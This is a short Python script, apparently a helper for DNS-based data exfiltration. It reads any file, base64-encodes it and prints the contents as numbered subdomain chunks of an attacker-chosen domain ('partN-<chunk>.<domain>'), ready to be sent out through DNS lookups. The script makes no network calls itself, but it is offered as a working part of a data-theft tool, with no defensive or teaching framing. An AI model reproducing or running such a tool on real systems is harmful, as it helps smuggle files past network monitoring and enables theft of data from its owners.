import sys
import base64

def main(file_to_send, dns_to_exfil, chars_limit):
    if not file_to_send and not dns_to_exfil and chars_limit == 0:
        print("All parameters are empty. Please provide values for all parameters.")
        return

    if chars_limit == 0 or chars_limit > 40:
        print("CharsLimit should be greater than 0 and less than or equal to 40.")
        return

    if file_to_send:
        try:
            with open(file_to_send, "rb") as file:
                binary = file.read()
                base64_encoded = base64.b64encode(binary).decode("utf-8")

                part_number = 0
                for i in range(0, len(base64_encoded), chars_limit):
                    part = base64_encoded[i:i + chars_limit]
                    part_number += 1
                    subdomain_exfiltration = "part{}-{}.{}".format(part_number, part, dns_to_exfil)
                    print(subdomain_exfiltration)
        except FileNotFoundError:
            print(f"The file does not exist at {file_to_send}")

if __name__ == "__main__":
    file_to_send = sys.argv[1] if len(sys.argv) > 1 else None
    dns_to_exfil = sys.argv[2] if len(sys.argv) > 2 else None
    chars_limit = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    main(file_to_send, dns_to_exfil, chars_limit)

